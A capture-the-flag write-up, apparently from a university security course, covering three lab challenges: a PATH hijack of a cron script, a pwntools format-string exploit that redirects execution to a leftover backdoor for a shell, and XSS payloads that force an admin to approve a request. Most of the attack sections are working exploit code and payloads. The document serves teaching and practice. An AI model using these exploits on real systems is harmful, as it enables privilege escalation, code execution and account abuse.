# CTF extra challenges

## British punctuality

On the `home/flag_reader` we noticed a script and upon analyzing further we noticed a vulnerability.
It was using the command `printenv` by calling a relative path. This meant we could exploit it by re-writing the PATH environment variable.
Because the script was using a file to load the environment, we created one to change the PATH variable.

```bash
nobody@caea6090734d:/tmp$ ls
env	last_log 
nobody@caea6090734d:/tmp$ cat env
export PATH=/tmp/:$PATH
```

The server was running `cron` to perform the script every minute. Our user did not have access to the flag file but the cron job did. So now we just needed to create our own `printenv` in order to get the flag.

```bash
nobody@caea6090734d:/tmp$ echo "cat ../flags/flag.txt" > printenv
```

After waiting for the script to be executed again, we opened the last_log and there was the flag.

## FinalFormat

After opening the program, we tested if the string format vulnerability was still there:

```bash
seed@VM:~/ctf/FinalFormat$ ./program 
There is nothing to see here...a%x%x
You gave me this:a2578256178
```

For this challenge, the backdoor had been removed. However, by using gdb we were able to find that it was still present in the code:

```bash
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
0x08049236  old_backdoor
...
``` 

Because of this, our plan was to redirect the flow of the program to that address. 
However, using `checksec` we figured that writing in the stack would be a tough task:

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Therefore, we used the gdb to try and find instructions where the code would use calls and jumps to other addresses.
Soon enough we found a jump to the following address: `0x0804c010`.

Now, we built an exploit that would re-write the backdoor function to that address using format vulnerabilities:

```py
from pwn import *

LOCAL = False

if LOCAL:
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4007)

#0x08049236  old_backdoor

N = 60
content = bytearray(0x0 for i in range(N))

content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
content[8:12]  =  ("????").encode('latin-1')
content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')

s = "%.2036x" + "%hn" + "%.35378x%hn"

fmt  = (s).encode('latin-1')
content[16:16+len(fmt)] = fmt

p.recvuntil(b"here...")
p.sendline(content)
p.interactive()
```

Running this, we were able to prompt a shell and cat the flag.

## Aply for Flag II

The description of the challenged mentioned the websites were separated. However, the XSS vulnerability was still there.
Because the admin would see the justification in a different page from the admin gui, we first tried sending a POST request with `fetch` using XSS.

```html
<script type="text/javascript">
fetch('http://ctf-fsi.fe.up.pt:5005/request/[id]/approve', {
    method: 'POST',
    credentials: 'include',
    mode: 'no-cors',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ "giveflag": "Give the flag" })
});
</script>
```

For some reason this did not work. Then, we tried actually creating a form identical to the admin one and force a click:

```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/[id]/approve" role="form">
    <div class="submit">
        
        <input id="abc" type="submit" id="giveflag" value="Give the flag">
        
    </div>
</form>
<script type="text/javascript">
document.querySelector('#abc').click()
</script>
```

After disabling js in the browser (to avoid running the script ourselves), we were able to get the flag.

